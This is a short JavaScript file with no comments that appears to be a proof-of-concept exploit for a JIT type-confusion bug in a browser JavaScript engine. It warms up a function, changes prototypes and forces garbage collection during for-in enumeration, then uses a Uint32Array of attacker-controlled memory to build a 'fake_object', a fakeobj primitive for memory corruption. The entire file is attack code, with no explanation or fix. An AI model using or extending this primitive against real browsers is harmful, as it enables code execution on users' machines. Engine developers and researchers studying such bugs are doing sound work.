function gc() {
    for (let i = 0; i < 10; i++) {
        let ab = new ArrayBuffer(1024 * 1024 * 10);
    }
}
function opt(obj) {
    for (let i = 0; i < 500; i++) {
    }
    let tmp = { a: 1 };
    gc();
    tmp.__proto__ = {};
    for (let k in tmp) {
        tmp.__proto__ = {};
        gc();
        obj.__proto__ = {};
        return obj[k];
    }
}
opt({});
let fake_object_memory = new Uint32Array(100);
fake_object_memory[0] = 4660;
let fake_object = opt(fake_object_memory);
